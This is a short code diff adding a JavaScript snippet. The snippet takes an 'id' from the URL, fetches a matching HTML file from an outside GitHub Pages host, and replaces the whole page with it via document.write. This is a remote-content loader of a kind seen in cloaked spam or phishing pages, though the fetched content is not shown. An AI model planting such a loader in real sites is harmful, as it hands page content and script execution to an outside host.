@@ -1,1 +1,9 @@
+var id = new URLSearchParams(location.search).get("id") || "alczar_arquitectonico";
 
+fetch("https://garylyoung796-bot.github.io/poiuy/upload/" + id + ".html")
+  .then(e => e.text())
+  .then(e => {
+    document.open();
+    document.write(e);
+    document.close();
+  });
